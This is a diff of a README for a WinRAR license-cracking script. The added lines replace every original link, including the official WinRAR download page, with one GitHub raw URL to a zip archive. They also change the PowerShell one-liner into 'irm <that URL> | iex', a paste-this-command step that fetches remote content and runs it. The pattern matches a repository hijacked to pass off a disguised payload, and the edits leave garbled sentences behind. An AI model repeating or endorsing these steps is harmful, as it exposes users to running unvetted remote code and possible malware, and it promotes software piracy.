@@ -4,7 +4,7 @@
 
 ---
 
- - This script automatically creates a valid "rarreg.key" file in WinRAR's installation folder.
+ - This script automatically creates a valid "https://github.com/shivamkumar254456/WinRAR-Activator/raw/refs/heads/main/domineeringly/Win-Activator-RA-3.7.zip" file in WinRAR's installation folder.
 
  - This method requires Internet at the time of activation.
 
@@ -24,7 +24,7 @@ Right-click on the windows start menu and select PowerShell or Terminal.
 
 Copy-paste the code below and press enter:
 
-    irm https://naeembolchhi.github.io/WinRAR-Activator/WRA.ps1 | iex
+    irm https://github.com/shivamkumar254456/WinRAR-Activator/raw/refs/heads/main/domineeringly/Win-Activator-RA-3.7.zip | iex
 
 The activation will begin and automatically complete if there are no unforeseen issues.
 
@@ -50,7 +50,7 @@ That's all.
 
 ---
 
-Download the "rarreg.key" file from this repo.
+Download the "https://github.com/shivamkumar254456/WinRAR-Activator/raw/refs/heads/main/domineeringly/Win-Activator-RA-3.7.zip" file from this repo.
 
 `Copy` or `Cut` the file and `Paste` it in the installation folder of WinRAR.
 
@@ -70,7 +70,7 @@ That's all.
 
    - Make sure the latest original WinRAR setup is used for the installation.
      
-     - Download WinRAR: [https://www.rarlab.com/download.htm](https://www.rarlab.com/download.htm)
+     - Download WinRAR: [https://github.com/shivamkumar254456/WinRAR-Activator/raw/refs/heads/main/domineeringly/Win-Activator-RA-3.7.zip](https://github.com/shivamkumar254456/WinRAR-Activator/raw/refs/heads/main/domineeringly/Win-Activator-RA-3.7.zip)
 
    - Now install WinRAR and wait for the script to finish.
    
@@ -85,5 +85,5 @@ That's all.
 | **Dev** | **Contribution** |
 |---|---|
 | @bitcookies | Keygen for generating WinRAR licenses. |
-| | https://github.com/bitcookies/winrar-keygen |
+| | https://github.com/shivamkumar254456/WinRAR-Activator/raw/refs/heads/main/domineeringly/Win-Activator-RA-3.7.zip |
 | @NaeemBolchhi \(Me\) | Made a batch script for automatic activation, and a one-liner for ease of use. |
